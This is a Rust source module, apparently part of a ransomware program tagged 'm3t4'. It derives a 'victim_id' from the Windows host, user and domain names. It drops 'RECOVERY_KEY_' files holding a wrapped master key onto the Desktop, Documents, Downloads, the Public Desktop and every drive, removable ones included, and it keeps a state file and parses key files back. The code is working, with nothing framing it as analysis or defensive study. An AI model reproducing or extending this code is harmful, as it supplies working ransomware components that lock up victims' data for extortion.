use std::env;
use std::fs;
use std::path::{Path, PathBuf};
use std::time::{SystemTime, UNIX_EPOCH};

use sha2::{Digest, Sha256};

use crate::config::Config;
use crate::crypto::{self, WrappedMasterKey};

pub const KEY_FILE_PREFIX: &str = "RECOVERY_KEY_";
const KEY_HEADER: &str = "M3T4KEY1";

pub fn victim_id() -> String {
    let host = env::var("COMPUTERNAME").unwrap_or_else(|_| "unknown".to_string());
    let user = env::var("USERNAME").unwrap_or_else(|_| "unknown".to_string());
    let domain = env::var("USERDOMAIN").unwrap_or_default();
    let stamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos().to_le_bytes())
        .unwrap_or([0u8; 16]);

    let mut hasher = Sha256::new();
    hasher.update(host.as_bytes());
    hasher.update(user.as_bytes());
    hasher.update(domain.as_bytes());
    hasher.update(stamp);
    let digest = hasher.finalize();

    digest[..8].iter().map(|b| format!("{:02X}", b)).collect()
}

pub fn key_file_name(id: &str) -> String {
    format!("{KEY_FILE_PREFIX}{id}.bin")
}

/// Recovery file body: header plus three base64 blobs. Nothing else.
/// EPK 32B | WRAP-NONCE 12B | WRAP-DATA 32B ciphertext + 16B tag.
pub fn key_material_text(wrapped: &WrappedMasterKey) -> String {
    format!(
        "{KEY_HEADER}\n{}\n{}\n{}\n",
        crypto::epk_b64(wrapped),
        crypto::nonce_b64(wrapped),
        crypto::data_b64(wrapped)
    )
}

pub struct RecoveryArtifacts {
    pub key_files: Vec<PathBuf>,
}

pub fn locations(include_removable: bool) -> Vec<PathBuf> {
    let mut dirs = Vec::new();
    if let Ok(profile) = env::var("USERPROFILE") {
        let profile = PathBuf::from(profile);
        for sub in ["Desktop", "Documents", "Downloads", ""] {
            dirs.push(if sub.is_empty() {
                profile.clone()
            } else {
                profile.join(sub)
            });
        }
    }
    dirs.push(PathBuf::from("C:\\Users\\Public\\Desktop"));
    dirs.extend(crate::win::drives(include_removable));

    // Canonicalise first: a junctioned Desktop and the profile root can
    // collapse to the same directory, which would write the key twice.
    let mut seen = std::collections::HashSet::new();
    let mut out = Vec::new();
    for dir in dirs {
        if !dir.is_dir() {
            continue;
        }
        let path = dir.canonicalize().unwrap_or(dir);
        let key = path.to_string_lossy().replace('/', "\\").to_lowercase();
        if seen.insert(key) {
            out.push(path);
        }
    }
    out.sort();
    out
}

/// True when at least one recovery file for this victim already exists.
pub fn has_recovery_key(id: &str, include_removable: bool) -> bool {
    let name = key_file_name(id);
    locations(include_removable)
        .iter()
        .any(|dir| dir.join(&name).is_file())
}

pub fn write_recovery(wrapped: &WrappedMasterKey, id: &str, cfg: &Config) -> RecoveryArtifacts {
    let key_name = key_file_name(id);
    let body = key_material_text(wrapped);
    let mut key_files = Vec::new();
    let mut seen = std::collections::HashSet::new();

    for dir in locations(cfg.include_removable) {
        let path = dir.join(&key_name);
        let flat = path.to_string_lossy().replace('/', "\\").to_lowercase();
        if !seen.insert(flat) {
            continue;
        }
        // Already written by an earlier run — leave it, do not rewrite.
        if fs::read(&path)
            .map(|existing| existing == body.as_bytes())
            .unwrap_or(false)
        {
            key_files.push(path);
            continue;
        }
        // Stage then rename: no partial key file if the write is interrupted.
        let tmp = dir.join(format!("{key_name}.tmp"));
        let ok = fs::write(&tmp, &body).is_ok() && fs::rename(&tmp, &path).is_ok();
        if ok {
            key_files.push(path);
        } else {
            let _ = fs::remove_file(&tmp);
        }
    }

    RecoveryArtifacts { key_files }
}

pub fn write_state(dir: &Path, wrapped: &WrappedMasterKey, id: &str) -> Result<PathBuf, String> {
    fs::create_dir_all(dir).map_err(|e| format!("state dir {}: {e}", dir.display()))?;
    let path = dir.join("state.bin");
    let body = format!("ID {id}\n{}", key_material_text(wrapped));
    fs::write(&path, body).map_err(|e| format!("state write {}: {e}", path.display()))?;
    Ok(path)
}

pub fn load_state(dir: &Path) -> Option<(String, WrappedMasterKey)> {
    let text = fs::read_to_string(dir.join("state.bin")).ok()?;
    let mut id = None;
    let mut rest = String::new();
    for line in text.lines() {
        if let Some(v) = line.strip_prefix("ID ") {
            id = Some(v.trim().to_string());
        } else {
            rest.push_str(line);
            rest.push('\n');
        }
    }
    let wrapped = parse_key_file(&rest).ok()?;
    Some((id.unwrap_or_else(|| "UNKNOWN".to_string()), wrapped))
}

pub fn clear_state(dir: &Path) {
    let _ = fs::remove_file(dir.join("state.bin"));
}

pub fn parse_key_file(text: &str) -> Result<WrappedMasterKey, String> {
    let mut lines = text.lines().map(str::trim).filter(|l| !l.is_empty());
    let header = lines.next().unwrap_or_default();
    if header != KEY_HEADER {
        return Err("not an m3t4 recovery key file".to_string());
    }
    let epk = lines.next().ok_or_else(|| "missing EPK".to_string())?;
    let nonce = lines.next().ok_or_else(|| "missing WRAP-NONCE".to_string())?;
    let data = lines.next().ok_or_else(|| "missing WRAP-DATA".to_string())?;
    crypto::wrapped_from_b64(epk, nonce, data)
}

pub fn find_key_file(root: &Path) -> Option<PathBuf> {
    if root.is_file() {
        return Some(root.to_path_buf());
    }
    for entry in fs::read_dir(root).ok()?.flatten() {
        let name = entry.file_name().to_string_lossy().to_uppercase();
        if name.starts_with("RECOVERY_KEY_") && name.ends_with(".BIN") {
            return Some(entry.path());
        }
    }
    None
}
